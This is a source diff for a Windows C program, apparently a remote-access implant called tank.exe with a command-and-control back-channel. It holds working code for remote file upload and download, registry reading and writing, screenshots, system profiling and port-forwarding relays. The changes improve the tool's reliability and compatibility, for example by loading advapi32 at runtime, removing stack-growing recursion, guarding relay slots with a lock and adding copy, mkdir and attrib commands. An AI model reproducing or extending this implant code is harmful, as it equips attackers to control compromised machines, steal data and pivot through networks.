@@ -158,6 +158,33 @@ static int          t_cred_valid = 0;
 static int          t_ctx_valid  = 0;
 static SecPkgContext_StreamSizes t_sizes;
 
+/* -----------------------------------------------------------------------
+ * ADVAPI32 — loaded at runtime so tank.exe has no static import for it.
+ * ADVAPI32.DLL is absent on Win32s; loading at runtime lets the EXE start
+ * there and gracefully disables registry/username commands.
+ * ----------------------------------------------------------------------- */
+typedef BOOL (WINAPI *pfGetUserNameA)(char *, DWORD *);
+typedef LONG (WINAPI *pfr_RegOpenKeyExA)(HKEY, const char *, DWORD, DWORD, HKEY *);
+typedef LONG (WINAPI *pfr_RegCreateKeyExA)(HKEY, const char *, DWORD, char *, DWORD, DWORD, void *, HKEY *, DWORD *);
+typedef LONG (WINAPI *pfr_RegCloseKey)(HKEY);
+typedef LONG (WINAPI *pfr_RegEnumValueA)(HKEY, DWORD, char *, DWORD *, DWORD *, DWORD *, BYTE *, DWORD *);
+typedef LONG (WINAPI *pfr_RegQueryInfoKeyA)(HKEY, char *, DWORD *, DWORD *, DWORD *, DWORD *, DWORD *, DWORD *, DWORD *, DWORD *, DWORD *, void *);
+typedef LONG (WINAPI *pfr_RegEnumKeyExA)(HKEY, DWORD, char *, DWORD *, DWORD *, char *, DWORD *, void *);
+typedef LONG (WINAPI *pfr_RegSetValueExA)(HKEY, const char *, DWORD, DWORD, const BYTE *, DWORD);
+typedef LONG (WINAPI *pfr_RegDeleteValueA)(HKEY, const char *);
+
+static HMODULE           t_advapi32        = NULL;
+static int               t_advapi32_avail  = 0;
+static pfGetUserNameA    r_GetUserName     = NULL;
+static pfr_RegOpenKeyExA   r_RegOpenKeyEx    = NULL;
+static pfr_RegCreateKeyExA r_RegCreateKeyEx  = NULL;
+static pfr_RegCloseKey     r_RegCloseKey     = NULL;
+static pfr_RegEnumValueA   r_RegEnumValue    = NULL;
+static pfr_RegQueryInfoKeyA r_RegQueryInfoKey = NULL;
+static pfr_RegEnumKeyExA   r_RegEnumKeyEx    = NULL;
+static pfr_RegSetValueExA  r_RegSetValueEx   = NULL;
+static pfr_RegDeleteValueA r_RegDeleteValue  = NULL;
+
 /* Encrypted receive buffer (raw from network) */
 static char  t_enc_buf[TLS_BUFSZ];
 static int   t_enc_len = 0;
@@ -182,7 +209,8 @@ typedef struct {
     SOCKET c2_sock;       /* back-channel to report new connections */
 } RelaySlot;
 
-static RelaySlot g_relays[MAX_RELAYS];
+static RelaySlot       g_relays[MAX_RELAYS];
+static CRITICAL_SECTION g_relay_cs;   /* guards slot allocation in g_relays[] */
 
 /* -----------------------------------------------------------------------
  * ToolHelp32 types (inline)
@@ -254,6 +282,19 @@ typedef struct { DWORD dwNumEntries; IPHLP_IPFWDROW table[1]; } IPHLP_IPFWDTABLE
 typedef DWORD (WINAPI *pfGetIpForwardTable)(PVOID, PDWORD, BOOL);
 
 /* -----------------------------------------------------------------------
+ * ICMP ping types (inline — no icmpapi.h required)
+ * icmp.dll present on NT 3.5+ and Win95+; loaded at runtime.
+ * ----------------------------------------------------------------------- */
+typedef struct { BYTE Ttl; BYTE Tos; BYTE Flags; BYTE OptionsSize; BYTE *OptionsData; } NC_IP_OPT;
+typedef struct {
+    DWORD  Address; ULONG Status; ULONG RoundTripTime;
+    USHORT DataSize; USHORT Reserved; PVOID Data; NC_IP_OPT Options;
+} NC_ICMP_REPLY;
+typedef HANDLE (WINAPI *pfIcmpCreate)(void);
+typedef BOOL   (WINAPI *pfIcmpClose)(HANDLE);
+typedef DWORD  (WINAPI *pfIcmpSend)(HANDLE, DWORD, void *, WORD, NC_IP_OPT *, void *, DWORD, DWORD);
+
+/* -----------------------------------------------------------------------
  * External: Recognizer module (recognizer.c)
  * ----------------------------------------------------------------------- */
 extern int recognizer_check(void);
@@ -276,6 +317,24 @@ static void tls_load(void)
     GF(t_QryCtxAttr, "QueryContextAttributesA")
 #undef GF
     t_tls_avail = 1;
+}
+
+static void advapi32_load(void)
+{
+    t_advapi32 = LoadLibrary("advapi32.dll");
+    if (!t_advapi32) return;
+#define GA(v,n) v = (void*)GetProcAddress(t_advapi32, n)
+    GA(r_GetUserName,      "GetUserNameA");
+    GA(r_RegOpenKeyEx,     "RegOpenKeyExA");
+    GA(r_RegCreateKeyEx,   "RegCreateKeyExA");
+    GA(r_RegCloseKey,      "RegCloseKey");
+    GA(r_RegEnumValue,     "RegEnumValueA");
+    GA(r_RegQueryInfoKey,  "RegQueryInfoKeyA");
+    GA(r_RegEnumKeyEx,     "RegEnumKeyExA");
+    GA(r_RegSetValueEx,    "RegSetValueExA");
+    GA(r_RegDeleteValue,   "RegDeleteValueA");
+#undef GA
+    if (r_RegOpenKeyEx) t_advapi32_avail = 1;
 }
 
 /* -----------------------------------------------------------------------
@@ -382,69 +441,67 @@ static void tls_teardown(void)
  * ----------------------------------------------------------------------- */
 static int tls_recv_byte(SOCKET s, char *out)
 {
-    int i;
+    /* Loop instead of recursing — recursion on INCOMPLETE_MESSAGE or empty
+     * records caused unbounded stack growth on NT 3.x's small default stack. */
+    for (;;) {
+        int i;
 
-    if (t_dec_r < t_dec_len) {
-        *out = t_dec_buf[t_dec_r++];
-        return 1;
-    }
-    t_dec_r = t_dec_len = 0;
-
-    /* Need more data */
-    {
-        int n = recv(s, t_enc_buf + t_enc_len,
-                     (int)(sizeof(t_enc_buf) - t_enc_len), 0);
-        if (n <= 0) return n;
-        t_enc_len += n;
-    }
-
-    {
-        SecBuffer bufs[4]; SecBufferDesc desc; ULONG qop = 0;
-        SECURITY_STATUS ss;
-
-        bufs[0].cbBuffer   = (ULONG)t_enc_len;
-        bufs[0].BufferType = NC_SECBUFFER_DATA;
-        bufs[0].pvBuffer   = t_enc_buf;
-        bufs[1].cbBuffer = 0; bufs[1].BufferType = NC_SECBUFFER_EMPTY; bufs[1].pvBuffer = NULL;
-        bufs[2].cbBuffer = 0; bufs[2].BufferType = NC_SECBUFFER_EMPTY; bufs[2].pvBuffer = NULL;
-        bufs[3].cbBuffer = 0; bufs[3].BufferType = NC_SECBUFFER_EMPTY; bufs[3].pvBuffer = NULL;
-        desc.ulVersion = NC_SECBUF_VERSION; desc.cBuffers = 4; desc.pBuffers = bufs;
-
-        ss = t_DecMsg(&t_ctx, &desc, 0, &qop);
-
-        if (ss == NC_SEC_E_INCOMPLETE_MESSAGE) {
-            /* Need even more encrypted data before we can decrypt */
-            return tls_recv_byte(s, out);
+        if (t_dec_r < t_dec_len) {
+            *out = t_dec_buf[t_dec_r++];
+            return 1;
         }
-        if (ss != NC_SEC_E_OK) return -1;
+        t_dec_r = t_dec_len = 0;
 
-        for (i = 0; i < 4; i++) {
-            if (bufs[i].BufferType == NC_SECBUFFER_DATA && bufs[i].cbBuffer > 0) {
-                int len = (int)bufs[i].cbBuffer;
-                if (len > (int)sizeof(t_dec_buf)) len = (int)sizeof(t_dec_buf);
-                memcpy(t_dec_buf, bufs[i].pvBuffer, len);
-                t_dec_len = len;
-                t_dec_r   = 0;
-                break;
+        {
+            int n = recv(s, t_enc_buf + t_enc_len,
+                         (int)(sizeof(t_enc_buf) - t_enc_len), 0);
+            if (n <= 0) return n;
+            t_enc_len += n;
+        }
+
+        {
+            SecBuffer bufs[4]; SecBufferDesc desc; ULONG qop = 0;
+            SECURITY_STATUS ss;
+
+            bufs[0].cbBuffer   = (ULONG)t_enc_len;
+            bufs[0].BufferType = NC_SECBUFFER_DATA;
+            bufs[0].pvBuffer   = t_enc_buf;
+            bufs[1].cbBuffer = 0; bufs[1].BufferType = NC_SECBUFFER_EMPTY; bufs[1].pvBuffer = NULL;
+            bufs[2].cbBuffer = 0; bufs[2].BufferType = NC_SECBUFFER_EMPTY; bufs[2].pvBuffer = NULL;
+            bufs[3].cbBuffer = 0; bufs[3].BufferType = NC_SECBUFFER_EMPTY; bufs[3].pvBuffer = NULL;
+            desc.ulVersion = NC_SECBUF_VERSION; desc.cBuffers = 4; desc.pBuffers = bufs;
+
+            ss = t_DecMsg(&t_ctx, &desc, 0, &qop);
+
+            if (ss == NC_SEC_E_INCOMPLETE_MESSAGE) {
+                continue; /* need more network data — loop to recv */
+            }
+            if (ss != NC_SEC_E_OK) return -1;
+
+            for (i = 0; i < 4; i++) {
+                if (bufs[i].BufferType == NC_SECBUFFER_DATA && bufs[i].cbBuffer > 0) {
+                    int len = (int)bufs[i].cbBuffer;
+                    if (len > (int)sizeof(t_dec_buf)) len = (int)sizeof(t_dec_buf);
+                    memcpy(t_dec_buf, bufs[i].pvBuffer, len);
+                    t_dec_len = len;
+                    t_dec_r   = 0;
+                    break;
+                }
+            }
+
+            t_enc_len = 0;
+            for (i = 0; i < 4; i++) {
+                if (bufs[i].BufferType == NC_SECBUFFER_EXTRA && bufs[i].cbBuffer > 0) {
+                    int extra = (int)bufs[i].cbBuffer;
+                    memmove(t_enc_buf, bufs[i].pvBuffer, extra);
+                    t_enc_len = extra;
+                    break;
+                }
             }
         }
-
-        t_enc_len = 0;
-        for (i = 0; i < 4; i++) {
-            if (bufs[i].BufferType == NC_SECBUFFER_EXTRA && bufs[i].cbBuffer > 0) {
-                int extra = (int)bufs[i].cbBuffer;
-                memmove(t_enc_buf, bufs[i].pvBuffer, extra);
-                t_enc_len = extra;
-                break;
-            }
-        }
+        /* t_dec_len == 0 means an empty TLS record (keep-alive/renegotiation);
+         * loop back to read the next record rather than recursing. */
     }
-
-    if (t_dec_len > 0) {
-        *out = t_dec_buf[t_dec_r++];
-        return 1;
-    }
-    return tls_recv_byte(s, out);  /* renegotiation / empty record */
 }
 
 /* -----------------------------------------------------------------------
@@ -592,7 +649,9 @@ static int cmd_sysinfo(SOCKET s)
     int           i;
 
     namesz = MAX_PATH; compname[0] = '\0'; GetComputerName(compname, &namesz);
-    namesz = MAX_PATH; username[0] = '\0'; GetUserName(username, &namesz);
+    namesz = MAX_PATH; username[0] = '\0';
+    if (r_GetUserName) r_GetUserName(username, &namesz);
+    else lstrcpy(username, "N/A");
     memset(&osv, 0, sizeof(osv)); osv.dwOSVersionInfoSize = sizeof(osv); GetVersionEx(&osv);
     ms.dwLength = sizeof(ms); GlobalMemoryStatus(&ms);
 
@@ -696,6 +755,10 @@ static int cmd_get(SOCKET s, const char *path)
         send_str(s,m); return send_done(s);
     }
     fsize = GetFileSize(hFile,NULL);
+    if (fsize==INVALID_FILE_SIZE) {
+        CloseHandle(hFile);
+        send_str(s,"get: cannot determine file size\r\n"); return send_done(s);
+    }
     wsprintf(header,"FILE:%lu\n",fsize);
     send_str(s,header);
     buf = (char*)GlobalAlloc(GMEM_FIXED,OUT_BUFSZ);
@@ -725,7 +788,20 @@ static int cmd_put(SOCKET s, const char *path)
 
     hFile = CreateFile(path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
     if (hFile==INVALID_HANDLE_VALUE) {
-        char m[MAX_PATH+40]; wsprintf(m,"put: cannot create '%s' (%lu)\r\n",path,GetLastError());
+        /* Drain the incoming byte stream before reporting error — without this
+         * the session loop reads binary upload data as the next command line. */
+        char m[MAX_PATH+40];
+        char *drain=(char*)GlobalAlloc(GMEM_FIXED,OUT_BUFSZ);
+        if (drain) {
+            DWORD drained=0;
+            while (drained<expected) {
+                DWORD want=expected-drained; if(want>OUT_BUFSZ) want=OUT_BUFSZ;
+                if(recv_exact(s,drain,want)<=0){GlobalFree(drain);return -1;}
+                drained+=want;
+            }
+            GlobalFree(drain);
+        }
+        wsprintf(m,"put: cannot create '%s' (%lu)\r\n",path,GetLastError());
         send_str(s,m); return send_done(s);
     }
 
@@ -754,7 +830,7 @@ static int cmd_regq(SOCKET s, const char *keypath)
     LONG  ret;
     DWORD idx;
     char  vname[256], line[1536];
-    BYTE  vdata[1024];
+    BYTE  vdata[1025];   /* +1 so we can force NUL at vdata[dsz] for REG_SZ */
 
     struct { const char *n; HKEY h; } hives[] = {
         {"HKLM\\",HKEY_LOCAL_MACHINE},{"HKEY_LOCAL_MACHINE\\",HKEY_LOCAL_MACHINE},
@@ -767,6 +843,7 @@ static int cmd_regq(SOCKET s, const char *keypath)
     int i;
 
     if (!keypath||!keypath[0]) { send_str(s,"regq: no key\r\n"); return send_done(s); }
+    if (!t_advapi32_avail) { send_str(s,"regq: registry unavailable (no advapi32.dll)\r\n"); return send_done(s); }
     hive = NULL;
     for (i=0;i<(int)(sizeof(hives)/sizeof(hives[0]));i++) {
         int n=lstrlen(hives[i].n);
@@ -774,16 +851,17 @@ static int cmd_regq(SOCKET s, const char *keypath)
     }
     if (!hive) { send_str(s,"regq: unknown hive\r\n"); return send_done(s); }
 
-    ret = RegOpenKeyEx(hive,subkey,0,KEY_READ,&hkey);
+    ret = r_RegOpenKeyEx(hive,subkey,0,KEY_READ,&hkey);
     if (ret!=ERROR_SUCCESS) {
         wsprintf(line,"regq: cannot open key (%ld)\r\n",ret);
         send_str(s,line); return send_done(s);
     }
     wsprintf(line,"[%s]\r\n",keypath); send_str(s,line);
     for (idx=0;;idx++) {
-        DWORD vsz=sizeof(vname),dsz=sizeof(vdata),vtype;
-        ret=RegEnumValue(hkey,idx,vname,&vsz,NULL,&vtype,vdata,&dsz);
+        DWORD vsz=sizeof(vname),dsz=sizeof(vdata)-1,vtype;
+        ret=r_RegEnumValue(hkey,idx,vname,&vsz,NULL,&vtype,vdata,&dsz);
         if (ret==ERROR_NO_MORE_ITEMS||ret!=ERROR_SUCCESS) break;
+        vdata[dsz]='\0'; /* ensure NUL-terminated for REG_SZ wsprintf */
         switch(vtype) {
         case REG_SZ: case REG_EXPAND_SZ:
             wsprintf(line,"  \"%s\" = \"%s\"\r\n",vname[0]?vname:"(Default)",(char*)vdata); break;
@@ -794,7 +872,7 @@ static int cmd_regq(SOCKET s, const char *keypath)
         }
         send_str(s,line);
     }
-    RegCloseKey(hkey);
+    r_RegCloseKey(hkey);
     return send_done(s);
 }
 
@@ -814,17 +892,158 @@ static int cmd_del(SOCKET s, const char *arg)
 }
 
 /* -----------------------------------------------------------------------
+ * cmd_mkdir — create a directory
+ * ----------------------------------------------------------------------- */
+/* -----------------------------------------------------------------------
+ * parse_path_arg — consume one path token from *pp, handling double-quote
+ * wrapping so that paths containing spaces work correctly.
+ *   cp "C:\My Files\a.txt" "D:\Backup\a.txt"
+ *   ren "old name.exe" newname.exe
+ * Writes the unquoted path to out[outsz], advances *pp past trailing
+ * whitespace, returns the number of characters written (0 = no token).
+ * ----------------------------------------------------------------------- */
+static int parse_path_arg(const char **pp, char *out, int outsz)
+{
+    int n = 0;
+    const char *p = *pp;
+    while (*p == ' ') p++;
+    if (*p == '"') {
+        p++;
+        while (*p && *p != '"' && n < outsz-1) out[n++] = *p++;
+        if (*p == '"') p++;
+    } else {
+        while (*p && *p != ' '  && n < outsz-1) out[n++] = *p++;
+    }
+    out[n] = '\0';
+    while (*p == ' ') p++;
+    *pp = p;
+    return n;
+}
+
+static int cmd_mkdir(SOCKET s, const char *arg)
+{
+    char line[MAX_PATH+40];
+    if (!arg||!arg[0]) { send_str(s,"mkdir: usage: mkdir <path>\r\n"); return send_done(s); }
+    if (!CreateDirectory(arg,NULL)) {
+        wsprintf(line,"mkdir: '%s': %lu\r\n",arg,GetLastError());
+    } else {
+        wsprintf(line,"mkdir: created '%s'\r\n",arg);
+    }
+    send_str(s,line); return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_cp — copy a file
+ * ----------------------------------------------------------------------- */
+static int cmd_cp(SOCKET s, const char *arg)
+{
+    const char *p = arg;
+    char src[MAX_PATH], dst[MAX_PATH], line[MAX_PATH*2+32];
+    if (!arg||!arg[0]) { send_str(s,"cp: usage: cp <src> <dst>\r\n"); return send_done(s); }
+    if (!parse_path_arg(&p, src, MAX_PATH) || !parse_path_arg(&p, dst, MAX_PATH)) {
+        send_str(s,"cp: usage: cp <src> <dst>  (quote paths containing spaces)\r\n");
+        return send_done(s);
+    }
+    if (!CopyFile(src,dst,FALSE)) {
+        wsprintf(line,"cp: '%s' -> '%s': %lu\r\n",src,dst,GetLastError());
+    } else {
+        wsprintf(line,"cp: '%s' -> '%s'\r\n",src,dst);
+    }
+    send_str(s,line); return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_attrib — display or change file attributes (+/-RSHA)
+ * Usage: attrib [+/-RSHA ...] <path>
+ *   No flags: display current attributes.
+ *   e.g. attrib +R -H C:\secret.txt
+ * ----------------------------------------------------------------------- */
+static int cmd_attrib(SOCKET s, const char *arg)
+{
+    char path[MAX_PATH], line[MAX_PATH+64];
+    DWORD attrs, set_bits=0, clear_bits=0;
+    const char *p;
+
+    if (!arg||!arg[0]) {
+        send_str(s,"attrib: usage: attrib [+/-RSHA ...] <path>\r\n");
+        return send_done(s);
+    }
+
+    path[0]='\0';
+    p=arg;
+    while (*p) {
+        while (*p==' ') p++;
+        if (!*p) break;
+        if (*p=='+' || *p=='-') {
+            char op=*p++;
+            while (*p && *p!=' ') {
+                DWORD bit=0;
+                char c=(char)((*p>='a'&&*p<='z')?(char)(*p-32):*p);
+                if      (c=='R') bit=FILE_ATTRIBUTE_READONLY;
+                else if (c=='H') bit=FILE_ATTRIBUTE_HIDDEN;
+                else if (c=='S') bit=FILE_ATTRIBUTE_SYSTEM;
+                else if (c=='A') bit=FILE_ATTRIBUTE_ARCHIVE;
+                if (bit) { if (op=='+') set_bits|=bit; else clear_bits|=bit; }
+                p++;
+            }
+        } else {
+            /* Quoted or plain path token */
+            if (*p == '"') {
+                const char *tok = ++p;
+                while (*p && *p != '"') p++;
+                lstrcpyn(path, tok, (int)(p-tok)+1);
+                if (*p == '"') p++;
+            } else {
+                const char *tok = p;
+                while (*p && *p != ' ') p++;
+                lstrcpyn(path, tok, (int)(p-tok)+1);
+            }
+        }
+    }
+
+    if (!path[0]) { send_str(s,"attrib: no path specified\r\n"); return send_done(s); }
+
+    attrs=GetFileAttributes(path);
+    if (attrs==0xFFFFFFFFUL) {
+        wsprintf(line,"attrib: '%s': %lu\r\n",path,GetLastError());
+        send_str(s,line); return send_done(s);
+    }
+
+    if (!set_bits && !clear_bits) {
+        /* display only */
+        wsprintf(line,"%c%c%c%c  %s\r\n",
+            (attrs&FILE_ATTRIBUTE_ARCHIVE) ?'A':'-',
+            (attrs&FILE_ATTRIBUTE_SYSTEM)  ?'S':'-',
+            (attrs&FILE_ATTRIBUTE_HIDDEN)  ?'H':'-',
+            (attrs&FILE_ATTRIBUTE_READONLY)?'R':'-',
+            path);
+    } else {
+        attrs=(attrs|set_bits)&~clear_bits;
+        if (!SetFileAttributes(path,attrs)) {
+            wsprintf(line,"attrib: '%s': %lu\r\n",path,GetLastError());
+        } else {
+            wsprintf(line,"attrib: '%s' -> [%c%c%c%c]\r\n",path,
+                (attrs&FILE_ATTRIBUTE_ARCHIVE) ?'A':'-',
+                (attrs&FILE_ATTRIBUTE_SYSTEM)  ?'S':'-',
+                (attrs&FILE_ATTRIBUTE_HIDDEN)  ?'H':'-',
+                (attrs&FILE_ATTRIBUTE_READONLY)?'R':'-');
+        }
+    }
+    send_str(s,line); return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
  * cmd_ren — rename / move a file or directory
  * ----------------------------------------------------------------------- */
 static int cmd_ren(SOCKET s, const char *arg)
 {
-    const char *sp;
+    const char *p = arg;
     char oldp[MAX_PATH], newp[MAX_PATH], line[MAX_PATH*2+16];
     if (!arg||!arg[0]) { send_str(s,"ren: usage: ren <old> <new>\r\n"); return send_done(s); }
-    sp = arg; while (*sp && *sp != ' ') sp++;
-    if (!*sp) { send_str(s,"ren: missing new name\r\n"); return send_done(s); }
-    lstrcpyn(oldp, arg, (int)(sp-arg)+1);
-    lstrcpyn(newp, sp+1, MAX_PATH);
+    if (!parse_path_arg(&p, oldp, MAX_PATH) || !parse_path_arg(&p, newp, MAX_PATH)) {
+        send_str(s,"ren: usage: ren <old> <new>  (quote paths containing spaces)\r\n");
+        return send_done(s);
+    }
     if (!MoveFile(oldp, newp)) {
         wsprintf(line,"ren: failed (%lu)\r\n",GetLastError());
     } else {
@@ -873,16 +1092,16 @@ static void find_recurse(const char *dir, const char *pat)
 
 static int cmd_find(SOCKET s, const char *arg)
 {
-    const char *sp;
-    char root[MAX_PATH], pat[MAX_PATH], line[64];
+    const char *p = arg;
+    char first[MAX_PATH], root[MAX_PATH], pat[MAX_PATH], line[64];
     if (!arg||!arg[0]) { send_str(s,"find: usage: find [<root>] <pattern>\r\n"); return send_done(s); }
-    sp = arg; while (*sp && *sp != ' ') sp++;
-    if (!*sp) {
+    parse_path_arg(&p, first, MAX_PATH);
+    if (!parse_path_arg(&p, pat, MAX_PATH)) {
+        /* One token: it is the pattern; use current directory as root */
         GetCurrentDirectory(MAX_PATH, root);
-        lstrcpyn(pat, arg, MAX_PATH);
+        lstrcpyn(pat, first, MAX_PATH);
     } else {
-        lstrcpyn(root, arg, (int)(sp-arg)+1);
-        lstrcpyn(pat, sp+1, MAX_PATH);
+        lstrcpy(root, first);
     }
     g_find_count = 0; g_find_sock = s;
     find_recurse(root, pat);
@@ -978,13 +1197,14 @@ static void regs_recurse(HKEY hbase, const char *path)
     HKEY  hkey;
     DWORD idx, vsz, dsz, vtype, nskcnt;
     char  vname[256], line[800];
-    BYTE  vdata[512];
+    BYTE  vdata[513];   /* +1 for forced NUL termination of REG_SZ */
 
-    if (RegOpenKeyEx(hbase, path, 0, KEY_READ, &hkey) != ERROR_SUCCESS) return;
+    if (r_RegOpenKeyEx(hbase, path, 0, KEY_READ, &hkey) != ERROR_SUCCESS) return;
 
     for (idx=0; ; idx++) {
-        vsz=sizeof(vname); dsz=sizeof(vdata); vtype=0;
-        if (RegEnumValue(hkey,idx,vname,&vsz,NULL,&vtype,vdata,&dsz) != ERROR_SUCCESS) break;
+        vsz=sizeof(vname); dsz=sizeof(vdata)-1; vtype=0;
+        if (r_RegEnumValue(hkey,idx,vname,&vsz,NULL,&vtype,vdata,&dsz) != ERROR_SUCCESS) break;
+        vdata[dsz]='\0';
         if (vtype==REG_SZ||vtype==REG_EXPAND_SZ) {
             const char *d = (const char *)vdata;
             int  tl = lstrlen(g_regs_term), dl = lstrlen(d), j;
@@ -997,15 +1217,15 @@ static void regs_recurse(HKEY hbase, const char *path)
         }
     }
     nskcnt = 0;
-    RegQueryInfoKey(hkey,NULL,NULL,NULL,&nskcnt,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
+    r_RegQueryInfoKey(hkey,NULL,NULL,NULL,&nskcnt,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
     for (idx=0; idx<nskcnt; idx++) {
-        char subname[256], fullpath[512];
+        char subname[256], fullpath[1024];
         DWORD namesz = sizeof(subname);
-        if (RegEnumKeyEx(hkey,idx,subname,&namesz,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS) break;
+        if (r_RegEnumKeyEx(hkey,idx,subname,&namesz,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS) break;
         wsprintf(fullpath,"%s\\%s",path,subname);
-        regs_recurse(hkey, subname);   /* relative from hkey */
+        regs_recurse(hbase, fullpath);
     }
-    RegCloseKey(hkey);
+    r_RegCloseKey(hkey);
 }
 
 static int cmd_regs(SOCKET s, const char *arg)
@@ -1015,6 +1235,7 @@ static int cmd_regs(SOCKET s, const char *arg)
     HKEY hive; const char *subkey;
 
     if (!arg||!arg[0]) { send_str(s,"regs: usage: regs <key> <term>\r\n"); return send_done(s); }
+    if (!t_advapi32_avail) { send_str(s,"regs: registry unavailable (no advapi32.dll)\r\n"); return send_done(s); }
     sp=arg; while(*sp&&*sp!=' ') sp++;
     if (!*sp) { send_str(s,"regs: missing search term\r\n"); return send_done(s); }
     lstrcpyn(keypath, arg, (int)(sp-arg)+1);
@@ -1037,6 +1258,7 @@ static int cmd_rege(SOCKET s, const char *arg)
     HKEY hive, hkey; const char *subkey; DWORD disp;
 
     if (!arg||!arg[0]) { send_str(s,"rege: usage: rege <key> <name> <data>\r\n"); return send_done(s); }
+    if (!t_advapi32_avail) { send_str(s,"rege: registry unavailable (no advapi32.dll)\r\n"); return send_done(s); }
     p1=arg; while(*p1&&*p1!=' ') p1++;
     if (!*p1) { send_str(s,"rege: missing value name\r\n"); return send_done(s); }
     lstrcpyn(keypath, arg, (int)(p1-arg)+1);
@@ -1047,12 +1269,12 @@ static int cmd_rege(SOCKET s, const char *arg)
 
     subkey = parse_hive(keypath, &hive);
     if (!subkey) { send_str(s,"rege: unknown hive\r\n"); return send_done(s); }
-    if (RegCreateKeyEx(hive,subkey,0,NULL,0,KEY_SET_VALUE,NULL,&hkey,&disp) != ERROR_SUCCESS) {
+    if (r_RegCreateKeyEx(hive,subkey,0,NULL,0,KEY_SET_VALUE,NULL,&hkey,&disp) != ERROR_SUCCESS) {
         wsprintf(line,"rege: cannot open/create key (%lu)\r\n",GetLastError());
         send_str(s,line); return send_done(s);
     }
-    RegSetValueEx(hkey, valname, 0, REG_SZ, (BYTE*)data, (DWORD)lstrlen(data)+1);
-    RegCloseKey(hkey);
+    r_RegSetValueEx(hkey, valname, 0, REG_SZ, (BYTE*)data, (DWORD)lstrlen(data)+1);
+    r_RegCloseKey(hkey);
     wsprintf(line,"rege: set [%s] \"%s\"\r\n",keypath,valname);
     send_str(s,line); return send_done(s);
 }
@@ -1069,13 +1291,14 @@ static void regx_recurse(HKEY hbase, const char *path, const char *hive_prefix)
     char  vname[256], line[1024];
     BYTE  vdata[512];
 
-    if (RegOpenKeyEx(hbase, path, 0, KEY_READ, &hkey) != ERROR_SUCCESS) return;
+    if (r_RegOpenKeyEx(hbase, path, 0, KEY_READ, &hkey) != ERROR_SUCCESS) return;
 
     wsprintf(line,"\r\n[%s\\%s]\r\n", hive_prefix, path); send_str(g_regx_sock, line);
 
     for (idx=0; ; idx++) {
-        vsz=sizeof(vname); dsz=sizeof(vdata); vtype=0;
-        if (RegEnumValue(hkey,idx,vname,&vsz,NULL,&vtype,vdata,&dsz)!=ERROR_SUCCESS) break;
+        vsz=sizeof(vname); dsz=sizeof(vdata)-1; vtype=0;
+        if (r_RegEnumValue(hkey,idx,vname,&vsz,NULL,&vtype,vdata,&dsz)!=ERROR_SUCCESS) break;
+        vdata[dsz]='\0';
         switch(vtype) {
         case REG_SZ:
             wsprintf(line,"\"%s\"=\"%s\"\r\n",vname[0]?vname:"@",(char*)vdata); break;
@@ -1087,21 +1310,22 @@ static void regx_recurse(HKEY hbase, const char *path, const char *hive_prefix)
         send_str(g_regx_sock, line);
     }
     nskcnt = 0;
-    RegQueryInfoKey(hkey,NULL,NULL,NULL,&nskcnt,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
+    r_RegQueryInfoKey(hkey,NULL,NULL,NULL,&nskcnt,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
     for (idx=0; idx<nskcnt; idx++) {
-        char subname[256], fullpath[512];
+        char subname[256], fullpath[1024];
         DWORD namesz=sizeof(subname);
-        if (RegEnumKeyEx(hkey,idx,subname,&namesz,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS) break;
+        if (r_RegEnumKeyEx(hkey,idx,subname,&namesz,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS) break;
         wsprintf(fullpath,"%s\\%s",path,subname);
-        regx_recurse(hkey, subname, hive_prefix);
+        regx_recurse(hbase, fullpath, hive_prefix);
     }
-    RegCloseKey(hkey);
+    r_RegCloseKey(hkey);
 }
 
 static int cmd_regx(SOCKET s, const char *arg)
 {
     HKEY hive; const char *subkey;
     if (!arg||!arg[0]) { send_str(s,"regx: usage: regx <key>\r\n"); return send_done(s); }
+    if (!t_advapi32_avail) { send_str(s,"regx: registry unavailable (no advapi32.dll)\r\n"); return send_done(s); }
     subkey = parse_hive(arg, &hive);
     if (!subkey) { send_str(s,"regx: unknown hive\r\n"); return send_done(s); }
     send_str(s,"Windows Registry Editor Version 5.00\r\n");
@@ -1127,6 +1351,12 @@ static int cmd_screenshot(SOCKET s)
     hdcScr = GetDC(NULL);
     hdcMem = CreateCompatibleDC(hdcScr);
     hBmp   = CreateCompatibleBitmap(hdcScr, w, h);
+    if (!hdcMem || !hBmp) {
+        if (hBmp)   DeleteObject(hBmp);
+        if (hdcMem) DeleteDC(hdcMem);
+        ReleaseDC(NULL, hdcScr);
+        send_str(s,"screenshot: GDI allocation failed\r\n"); return send_done(s);
+    }
     SelectObject(hdcMem, hBmp);
     BitBlt(hdcMem, 0, 0, w, h, hdcScr, 0, 0, SRCCOPY);
     ReleaseDC(NULL, hdcScr);
@@ -1267,16 +1497,6 @@ static DWORD WINAPI portfwd_accept_thread(LPVOID arg)
                 closesocket(cs); closesocket(rs); continue;
             }
 
-            /* Report new tunnel to Joshua */
-            if (slot->c2_sock != INVALID_SOCKET) {
-                wsprintf(info, "RELAY %d:%d CONNECT %s:%s:%d\r\n",
-                         slot->lport,
-                         (int)peer.sin_port,
-                         inet_ntoa(peer.sin_addr),
-                         slot->rhost, slot->rport);
-                send(slot->c2_sock, info, lstrlen(info), 0);
-            }
-
             /* Spawn relay thread */
             {
                 RelayCTX *ctx = (RelayCTX *)malloc(sizeof(RelayCTX));
@@ -1314,19 +1534,22 @@ static int cmd_portfwd(SOCKET s, const char *args)
         send_str(s, "portfwd: invalid port\r\n"); return send_done(s);
     }
 
+    EnterCriticalSection(&g_relay_cs);
     for (i = 0; i < MAX_RELAYS; i++) {
         if (!g_relays[i].active) { slot = &g_relays[i]; break; }
     }
+    if (slot) slot->active = 1;  /* claim slot while holding the CS */
+    LeaveCriticalSection(&g_relay_cs);
     if (!slot) { send_str(s, "portfwd: too many active relays\r\n"); return send_done(s); }
 
     ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (ls == INVALID_SOCKET) { send_str(s, "portfwd: socket failed\r\n"); return send_done(s); }
